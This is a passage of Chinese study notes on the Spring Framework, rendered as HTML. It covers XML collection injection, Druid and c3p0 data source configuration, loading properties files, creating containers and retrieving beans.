punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.dao.impl.BookDaoImpl<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>array<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>array</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>200<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>300<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ref</span> <span class="token attr-name">bean</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>beanID<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>array</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>list<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>itcast<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>itheima<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>boxuegu<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>set<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>set</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>itcast<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>itheima<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>boxuegu<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>boxuegu<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>set</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>map<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>map</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>entry</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>country<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>china<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>entry</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ZhangSan<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>entry</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>addr<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Qingdao<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>map</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>properties<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>props</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prop</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>country<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>china<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prop</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prop</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>ZhangSan<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prop</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prop</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>age<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>15<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prop</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>props</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="14-案例数据源对象管理"><a class="markdownIt-Anchor" href="#14-案例数据源对象管理">#</a> 14、案例：数据源对象管理</h1><h2 id="141-druid"><a class="markdownIt-Anchor" href="#141-druid">#</a> 14.1 Druid</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.alibaba.druid.pool.DruidDataSource<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>driverClassName<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.mysql.jdbc.Driver<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jdbc:mysql://localhost:3306/spring_db<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>support<span class="token punctuation">.</span></span><span class="token class-name">ClassPathXmlApplicationContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">DataSource</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">App</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ClassPathXmlApplicationContext</span> classPathXmlApplicationContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"applicationContext.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DataSource</span> dataSource <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">DataSource</span><span class="token punctuation">)</span> classPathXmlApplicationContext<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"dataSource"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>dataSource<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="142-c3p0"><a class="markdownIt-Anchor" href="#142-c3p0">#</a> 14.2 c3p0</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.mchange.v2.c3p0.ComboPooledDataSource<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>driverClass<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.mysql.jdbc.Driver<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jdbcUrl<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jdbc:mysql://localhost:3306/spring_db<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>在使用第三方资源时，使用构造器还是 setter 注入要去看这个类提供的方法</li></ul><h1 id="15-加载properties文件"><a class="markdownIt-Anchor" href="#15-加载properties文件">#</a> 15、加载 properties 文件</h1><ol><li><p>开启新的 context 命名空间</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>context</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/context<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>       http://www.springframework.org/schema/beans       http://www.springframework.org/schema/beans/spring-beans.xsd       http://www.springframework.org/schema/context       http://www.springframework.org/schema/context/spring-context.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220828101909970.png" alt="image-20220828101909970"></p></li><li><p>使用 context 命名空间，加载指定 properties 文件</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>property-placeholder</span> <span class="token attr-name">location</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jdbc.properties<span class="token punctuation">"</span></span> <span class="token attr-name">system-properties-mode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>NEVER<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>system-properties-mode="NEVER"：不加载系统属性加载多个文件可以使用*.properties 或者用逗号隔开标准写法：location="classpath:*.properties"location="classpath*:*.properties" 表示不仅可以从当前工程文件读，也可以读导入的jar包中的配置文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>使用 ${} 读取加载的属性值</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.alibaba.druid.pool.DruidDataSource<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>driverClassName<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;jdbc.driver&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;jdbc.url&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;jdbc.username&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;jdbc.password&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>context</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/context<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>       http://www.springframework.org/schema/beans       http://www.springframework.org/schema/beans/spring-beans.xsd       http://www.springframework.org/schema/context       http://www.springframework.org/schema/context/spring-context.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!--    1.开启context命名空间--></span><span class="token comment">&lt;!--    2.使用context空间加载properties文件--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>property-placeholder</span> <span class="token attr-name">location</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jdbc.properties<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.alibaba.druid.pool.DruidDataSource<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>driverClassName<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;jdbc.driver&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;jdbc.url&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;jdbc.username&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;jdbc.password&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="16-容器"><a class="markdownIt-Anchor" href="#16-容器">#</a> 16、容器</h1><h2 id="161-创建容器的两种方法"><a class="markdownIt-Anchor" href="#161-创建容器的两种方法">#</a> 16.1 创建容器的两种方法</h2><ul><li>方法一：类路径加载配置文件</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ClassPathXmlApplicationContext</span> ctx1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"applicationContext.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>方法二：文件路径加载配置文件</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ApplicationContext</span> ctx2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileSystemXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"E:\\Code\\java\\spring_study\\src\\main\\resources\\applicationContext.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>加载多个配置文件</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ClassPathXmlApplicationContext</span> ctx1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"applicationContext.xml"</span><span class="token punctuation">,</span> <span class="token string">"bean2.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="162-容器类层次结构图"><a class="markdownIt-Anchor" href="#162-容器类层次结构图">#</a> 16.2 容器类层次结构图</h2><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220828104032456.png" alt="image-20220828104032456"></p><h2 id="163-获取bean的三种方法"><a class="markdownIt-Anchor" href="#163-获取bean的三种方法">#</a> 16.3 获取 bean 的三种方法</h2><ul><li>直接获取后强转</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">BookDao</span> bookDao <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">BookDao</span><span class="token punctuation">)</span> ctx1<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"bookDao"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>在获取时传参指定对象类型</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">BookDao</span> bookDao1 <span class="token operator">=</span> ctx1<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"bookDao"</span><span class="token punctuation">,</span><span class="token class-name">BookDao</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>自动获取（bean 要唯一）</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">BookDao</span> bookDao2 <span class="token operator">=</span> ctx1<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">BookDao</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="17-核心容器总结"><a class="markdownIt-Anchor" href="#17-核心容器总结">#</a> 17、核心容器总结</h1><ul><li>BeanFactory 是 IoC 容器的顶层接口，初始化 BeanFactory 对象时，加载的 bean 延迟加载</li><li>ApplicationContext 接口是 Spring 容器的核心接口，初始化 bean 时立即加载，<mark>想延迟加载，bean 标签加参数 lazy-init=“true”</mark></li><li>ApplicationContext 接口提供基础的 bean 操作相关方法，通过其他接口扩展其功能</li><li>ApplicationContext 接口常用初始化类<ul><li>ClassPathXmlApplicationContext</li><li>FileSystemXmlApplicationContext</li></ul></li><li>bean 相关</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220828104551491.png" alt="image-20220828104551491"></p><ul><li>依赖注入相关</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220828104655193.png" alt="image-20220828104655193"></p><h1 id="18-注解开发定义bean"><a class="markdownIt-Anchor" href="#18-注解开发定义bean">#</a> 18、注解开发定义 bean</h1><h2 id="181-注解开发定义bean"><a class="markdownIt-Anchor" href="#181-注解开发定义bean">#</a> 18.1 注解开发定义 bean</h2><ul><li>使用 @Component 定义 bean</li></ul><pre 